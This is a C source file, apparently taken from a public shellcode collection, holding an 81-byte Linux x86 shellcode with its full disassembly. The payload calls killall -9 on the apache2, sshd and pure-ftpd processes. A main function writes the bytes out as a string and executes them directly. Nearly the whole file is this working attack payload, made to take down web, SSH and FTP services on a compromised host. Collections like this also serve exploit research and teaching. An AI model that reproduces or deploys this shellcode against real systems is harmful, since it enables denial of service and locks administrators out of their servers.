/*  Linux x86 | Kill Service - Apache2
 *			     - Pure-Ftpd
 *                           - sshd
 *
 *  Shellcode 81 bytes
 *  Auhtor: Jonathan Salwan js.rac.projet [AT] gmail.com
 *  Web: http://www.shell-storm.org
 *
 *
 *Disassembly of section .text:

 * 08048060 <_start>:
 * 8048060:       6a 0b                   push   $0xb
 * 8048062:       58                      pop    %eax
 * 8048063:       99                      cltd       
 * 8048064:       52                      push   %edx
 * 8048065:       6a 32                   push   $0x32
 * 8048067:       66 68 68 65             pushw  $0x6568
 * 804806b:       68 61 70 61 63          push   $0x63617061
 * 8048070:       89 e7                   mov    %esp,%edi
 * 8048072:       52                      push   %edx
 * 8048073:       68 73 73 68 64          push   $0x64687373
 * 8048078:       89 e5                   mov    %esp,%ebp
 * 804807a:       52                      push   %edx
 * 804807b:       6a 64                   push   $0x64
 * 804807d:       68 2d 66 74 70          push   $0x7074662d
 * 8048082:       68 70 75 72 65          push   $0x65727570
 * 8048087:       89 e6                   mov    %esp,%esi
 * 8048089:       52                      push   %edx
 * 804808a:       66 68 2d 39             pushw  $0x392d
 * 804808e:       89 e1                   mov    %esp,%ecx
 * 8048090:       52                      push   %edx
 * 8048091:       68 6c 61 6c 6c          push   $0x6c6c616c
 * 8048096:       68 2f 6b 69 6c          push   $0x6c696b2f
 * 804809b:       68 2f 62 69 6e          push   $0x6e69622f
 * 80480a0:       68 2f 75 73 72          push   $0x7273752f
 * 80480a5:       89 e3                   mov    %esp,%ebx
 * 80480a7:       52                      push   %edx
 * 80480a8:       57                      push   %edi
 * 80480a9:       55                      push   %ebp
 * 80480aa:       56                      push   %esi
 * 80480ab:       51                      push   %ecx
 * 80480ac:       53                      push   %ebx
 * 80480ad:       89 e1                   mov    %esp,%ecx
 * 80480af:       cd 80                   int    $0x80
 *
 */

int main(int argc, char *argv[])
	{
	
		char shell[] = 	"\x6a\x0b"
				"\x58"
				"\x99"
				//--------apache2
				"\x52"
				"\x6a\x32"
				"\x66\x68\x68\x65"
				"\x68\x61\x70\x61\x63"
				"\x89\xe7"
				//---------------
				//-----------sshd
				"\x52"
				"\x68\x73\x73\x68\x64"
				"\x89\xe5"
				//---------------
				//------pure-ftpd
				"\x52"
				"\x6a\x64"
				"\x68\x2d\x66\x74\x70"
				"\x68\x70\x75\x72\x65"
				"\x89\xe6"
				//---------------
				"\x52"
				"\x66\x68\x2d\x39"
				"\x89\xe1"
				"\x52"
				"\x68\x6c\x61\x6c\x6c"
				"\x68\x2f\x6b\x69\x6c"
				"\x68\x2f\x62\x69\x6e"
				"\x68\x2f\x75\x73\x72"
				"\x89\xe3"
				"\x52"
				"\x57"
				"\x55"
				"\x56"
				"\x51"
				"\x53"
				"\x89\xe1"
				"\xcd\x80";

	printf("Length: %d\n",strlen(shell));
	(*(void(*)()) shell)();
	
	return 0;
}